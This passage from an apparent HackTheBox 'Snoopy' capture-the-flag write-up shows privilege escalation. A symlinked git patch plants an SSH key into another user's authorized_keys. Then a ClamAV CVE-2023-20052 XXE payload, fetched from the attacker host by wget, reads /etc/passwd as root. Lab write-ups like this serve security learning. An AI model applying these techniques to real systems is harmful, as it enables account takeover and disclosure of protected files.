</span></span><span style=display:flex><span>hint:
</span></span><span style=display:flex><span>hint:   git branch -m &lt;name&gt;
</span></span><span style=display:flex><span>Initialized empty Git repository in /home/cbrown/repo/.git/
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>cbrown@snoopy:~/repo$ echo <span style=color:#0086d2>&#34;diff --git a/symlink b/renamed-symlink
</span></span></span><span style=display:flex><span><span style=color:#0086d2>similarity index 100%
</span></span></span><span style=display:flex><span><span style=color:#0086d2>rename from symlink
</span></span></span><span style=display:flex><span><span style=color:#0086d2>rename to renamed-symlink
</span></span></span><span style=display:flex><span><span style=color:#0086d2>--
</span></span></span><span style=display:flex><span><span style=color:#0086d2>diff --git /dev/null b/renamed-symlink/create-me
</span></span></span><span style=display:flex><span><span style=color:#0086d2>new file mode 100644
</span></span></span><span style=display:flex><span><span style=color:#0086d2>index 0000000..039727e
</span></span></span><span style=display:flex><span><span style=color:#0086d2>--- /dev/null
</span></span></span><span style=display:flex><span><span style=color:#0086d2>+++ b/renamed-symlink/authorized_keys
</span></span></span><span style=display:flex><span><span style=color:#0086d2>@@ -0,0 +1 @@
</span></span></span><span style=display:flex><span><span style=color:#0086d2>+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKedRFqb+23I77T/09HrcXnhZIYcDNJGk1k4V8mcg1pDCBTb+0N2hadgS4QuT846ZOsKFtBqiaZSaPebZAPw0htj7jrX2rsy0zrhXyWnaVFo0vYmVxogVYL7p67rM96vn4XW4+NaupBRvg07CNGdGgekoKj2TP8dCo/UPiSt5lCN0siYuQKuTI/VJnD6soy9TNGMV9hnX6UHDqnM8+PEu7oLaEPRz/ergSLxgHs/5qvZeeLTrhWtgvZkhHrp1dPWGVB+BY9+/EjvimeFbnvltAuMf8w8+fD1J5YoiK009buSOe/s4LaeLcWyFEoCGqEAVOWI8EqcH1XSumesAEvNoxpXjHKmwyQpRhXjwPGBSlteTCmFvGUBncY8YktV46hmHP+i1rLowyPhnbBWpMV7DOtfAPE5jZaXKNjmdKm0dgYwsHGkV677YcdDrg9FUM1wleECo8X+3w4GkFW3n+dWMK6hKeEosuW8IJX0SeTL+ESLBHVCrQaR9iWIKIRz/TFQU= cbrown@snoopy.htb&#34;</span> &gt; patch
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>cbrown@snoopy:~/repo$ ln -s /home/sbrown/.ssh symlink
</span></span><span style=display:flex><span>cbrown@snoopy:~/repo$ chmod <span style=color:#0086f7;font-weight:700>777</span> /home/cbrown/repo
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>cbrown@snoopy:~/repo$ sudo -u sbrown /usr/bin/git apply -v patch
</span></span><span style=display:flex><span>Checking patch <span style=color:#fb660a>symlink</span> =&gt; renamed-symlink...
</span></span><span style=display:flex><span>Checking patch renamed-symlink/authorized_keys...
</span></span><span style=display:flex><span>Applied patch <span style=color:#fb660a>symlink</span> =&gt; renamed-symlink cleanly.
</span></span><span style=display:flex><span>Applied patch renamed-symlink/authorized_keys cleanly.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>cbrown@snoopy:~/repo$ ssh sbrown@snoopy.htb
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>sbrown@snoopy:~$ id
</span></span><span style=display:flex><span><span style=color:#fb660a>uid</span>=1001(sbrown) <span style=color:#fb660a>gid</span>=1001(sbrown) <span style=color:#fb660a>groups</span>=1001(sbrown),1002(devops)
</span></span><span style=display:flex><span>sbrown@snoopy:~$ ls
</span></span><span style=display:flex><span>scanfiles  user.txt
</span></span></code></pre></div><h2 id=root-flag>Root Flag
<a class=heading-link href=#root-flag><i class="fa fa-link" aria-hidden=true></i></a></h2><p>What we have in sudo?</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>sbrown@snoopy:~$ sudo -l
</span></span><span style=display:flex><span>Matching Defaults entries <span style=color:#fb660a;font-weight:700>for</span> sbrown on snoopy:
</span></span><span style=display:flex><span>    <span style=color:#fb660a>env_keep</span>+=<span style=color:#0086d2>&#34;LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET&#34;</span>, <span style=color:#fb660a>env_keep</span>+=<span style=color:#0086d2>&#34;XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#fb660a>secure_path</span>=/usr/local/sbin<span style=color:#0086d2>\:</span>/usr/local/bin<span style=color:#0086d2>\:</span>/usr/sbin<span style=color:#0086d2>\:</span>/usr/bin<span style=color:#0086d2>\:</span>/sbin<span style=color:#0086d2>\:</span>/bin, mail_badpass
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>User sbrown may run the following commands on snoopy:
</span></span><span style=display:flex><span>    (root) NOPASSWD: /usr/local/bin/clamscan ^--debug /home/sbrown/scanfiles/[a-zA-Z0-9.]+$
</span></span></code></pre></div><h3 id=clamav-cve-2023-20052>ClamAV CVE-2023-20052
<a class=heading-link href=#clamav-cve-2023-20052><i class="fa fa-link" aria-hidden=true></i></a></h3><p>We exploit the vulnerability:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>git clone https://github.com/nokn0wthing/CVE-2023-20052.git
</span></span><span style=display:flex><span>cd CVE-2023-20052
</span></span><span style=display:flex><span>sudo docker build -t cve-2023-20052 .
</span></span><span style=display:flex><span>sudo docker run -v <span style=color:#fb660a;font-weight:700>$(</span>pwd<span style=color:#fb660a;font-weight:700>)</span>:/exploit -it cve-2023-20052 bash
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>genisoimage -D -V <span style=color:#0086d2>&#34;exploit&#34;</span> -no-pad -r -apple -file-mode <span style=color:#0086f7;font-weight:700>0777</span> -o test.img . &amp;&amp; dmg dmg test.img test.dmg
</span></span><span style=display:flex><span>bbe -e <span style=color:#0086d2>&#39;s|&lt;!DOCTYPE plist PUBLIC &#34;-//Apple Computer//DTD PLIST 1.0//EN&#34; &#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&#34;&gt;|&lt;!DOCTYPE plist [&lt;!ENTITY xxe SYSTEM &#34;/etc/passwd&#34;&gt; ]&gt;|&#39;</span> -e <span style=color:#0086d2>&#39;s/blkx/&amp;xxe\;/&#39;</span> test.dmg -o exploit.dmg
</span></span></code></pre></div><p>Now we run clamscan with debug mode as required by sudo:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>sbrown@snoopy:~/scanfiles$ wget http://10.10.14.7:6666/exploit.dmg .
</span></span><span style=display:flex><span>--2023-08-25 15:26:54--  http://10.10.14.7:6666/exploit.dmg
</span></span><span style=display:flex><span>Connecting to 10.10.14.7:6666... connected.
</span></span><span style=display:flex><span>HTTP request sent, awaiting response... <span style=color:#0086f7;font-weight:700>200</span> OK
</span></span><span style=display:flex><span>Length: <span style=color:#0086f7;font-weight:700>114823</span> (112K) [application/octet-stream]
</span></span><span style=display:flex><span>Saving to: <span style=color:#0086d2>&#39;exploit.dmg&#39;</span>
</span></span><span style=display:flex><span>2023-08-25 15:26:54 (<span style=color:#0086f7;font-weight:700>253</span> KB/s) - ‘exploit.dmg’ saved [114823/114823]
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>sbrown@snoopy:~/scanfiles$ ls
</span></span><span style=display:flex><span>exploit.dmg
</span></span><span style=display:flex><span>sbrown@snoopy:~/scanfiles$ sudo /usr/local/bin/clamscan --debug /home/sbrown/scanfiles/exploit.dmg
</span></span><span style=display:flex><span>LibClamAV debug: searching <span style=color:#fb660a;font-weight:700>for</span> unrar, user-searchpath: /usr/local/lib
</span></span><span style=display:flex><span>LibClamAV debug: unrar support loaded from /usr/local/lib/libclamunrar_iface.so.11.0.0
</span></span><span style=display:flex><span>LibClamAV debug: Initialized 1.0.0 engine
</span></span></code></pre></div><p>And you will see the flag :)<figure class=image-container><a href=/i/2023-08-25_11-28.png><img width=100% src=/i/2023-08-25_11-28.png alt="Clamscan CVE"></a><figcaption>&#8213; Clamscan CVE &#8213;</figcaption></figure></p><h2 id=todos>TODOs
<a class=heading-link href=#todos><i class="fa fa-link" aria-hidden=true></i></a></h2><ul><li>Review RNDC<blockquote><p>rndc stands for Remote Name Daemon Control. It&rsquo;s a command line tool used to manage the BIND DNS server. With rndc, you can control the operation of a name server.</p></blockquote></li><li>Review in depth git: CVE-2023-22490 and CVE-2023-23946</li></ul></article></section></div><footer class=footer><section class=container>©
2021 -
2024
Dennis Ruiz
·
Powered by <a href=https://gohugo.io/>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/>Coder</a>.</section></footer></main><script src=/js/coder.min.236049395dc3682fb2719640872958e12f1f24067bb09c327b233e6290c7edac.js integrity="sha256-I2BJOV3DaC+ycZZAhylY4S8fJAZ7sJwyeyM+YpDH7aw="></script><script async src="https://www.googletagmanager.com/gtag/js?id=G-6CQZY8W0WD"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-6CQZY8W0WD")</script><script>$(document).on("input propertychange paste change",".FilterSearch",function(){var n=$(this).val().toLowerCase(),s=$(this).closest("ul"),t=s.find("li:gt(0)");t.hide(),t.filter(function(){var e=$(this).text().toLowerCase();return e.indexOf(n)>=0}).show()})</script></body></html>